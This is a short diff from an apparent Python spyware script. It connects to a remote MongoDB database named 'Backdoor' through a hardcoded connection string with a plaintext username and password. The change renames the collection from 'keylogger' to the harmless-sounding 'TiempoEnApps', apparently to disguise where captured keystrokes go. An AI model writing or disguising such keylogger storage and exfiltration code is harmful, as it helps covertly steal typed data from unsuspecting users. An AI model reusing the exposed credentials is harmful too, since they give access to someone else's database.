@@ -9,7 +9,7 @@ import datetime
 mongo_uri = "mongodb+srv://iraldejordan10:r5dcxq5RHNDrxt69@jarviscluster.et2fo.mongodb.net/"
 client = MongoClient(mongo_uri)
 db = client["Backdoor"]
-collection = db["keylogger"]
+collection = db["TiempoEnApps"]
 
 # Directorio donde se guardarán los datos localmente
 desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
